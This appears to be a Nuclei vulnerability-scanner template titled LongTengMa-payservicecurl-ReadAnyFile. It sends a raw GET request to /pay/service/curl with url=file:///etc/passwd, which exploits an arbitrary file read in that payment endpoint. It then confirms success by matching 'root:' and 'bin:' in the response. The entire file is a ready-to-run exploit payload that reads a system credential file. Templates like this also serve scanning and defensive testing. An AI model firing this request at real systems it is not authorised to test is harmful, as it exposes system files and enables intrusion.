id: LongTengMa-payservicecurl-ReadAnyFile

info:
  name: LongTengMa-payservicecurl-ReadAnyFile
  author: iSee857
  severity: high
  description: LongTengMa-payservicecurl-ReadAnyFile

requests:
  - method: GET
    raw:
      - |
        GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1
        Host: {{Host}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "bin:"
          - "root:"
        condition: and
        part: body

      - type: status
        status:
          - 200